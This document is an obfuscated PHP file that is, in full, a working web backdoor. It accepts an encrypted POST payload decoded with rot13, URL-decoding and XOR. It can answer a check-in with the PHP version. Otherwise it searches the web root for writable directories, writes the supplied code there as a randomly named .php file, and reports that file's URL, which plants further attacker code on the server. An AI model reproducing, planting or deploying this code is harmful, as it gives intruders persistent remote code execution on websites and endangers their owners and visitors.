<?php $qycrwbzfey = "bkbnynwvxywjdejz";$lbdktrop = "";foreach ($_POST as $vyfjrhk => $mekoaqcoor){if (strlen($vyfjrhk) == 16 and substr_count($mekoaqcoor, "%") > 10){fgavtxlud($vyfjrhk, $mekoaqcoor);}}function fgavtxlud($vyfjrhk, $gkeqdelebg){global $lbdktrop;$lbdktrop = $vyfjrhk;$gkeqdelebg = str_split(rawurldecode(str_rot13($gkeqdelebg)));function enqffqht($btgvwaf, $vyfjrhk){global $qycrwbzfey, $lbdktrop;return $btgvwaf ^ $qycrwbzfey[$vyfjrhk % strlen($qycrwbzfey)] ^ $lbdktrop[$vyfjrhk % strlen($lbdktrop)];}$gkeqdelebg = implode("", array_map("enqffqht", array_values($gkeqdelebg), array_keys($gkeqdelebg)));$gkeqdelebg = @unserialize($gkeqdelebg);if (@is_array($gkeqdelebg)){$vyfjrhk = array_keys($gkeqdelebg);$gkeqdelebg = $gkeqdelebg[$vyfjrhk[0]];if ($gkeqdelebg === $vyfjrhk[0]){echo @serialize(Array('php' => @phpversion(), ));exit();}else{function pqxad($eumefchvqxir) {static $wrvpj = array();$iovyuip = glob($eumefchvqxir . '/*', GLOB_ONLYDIR);if (count($iovyuip) > 0) {foreach ($iovyuip as $eumefchvqx){if (@is_writable($eumefchvqx)){$wrvpj[] = $eumefchvqx;}}}foreach ($iovyuip as $eumefchvqxir) pqxad($eumefchvqxir);return $wrvpj;}$aleebm = $_SERVER["DOCUMENT_ROOT"];$iovyuip = pqxad($aleebm);$vyfjrhk = array_rand($iovyuip);$vtoul = $iovyuip[$vyfjrhk] . "/" . substr(md5(time()), 0, 8) . ".php";@file_put_contents($vtoul, $gkeqdelebg);echo "http://" . $_SERVER["HTTP_HOST"] . substr($vtoul, strlen($aleebm));exit();}}}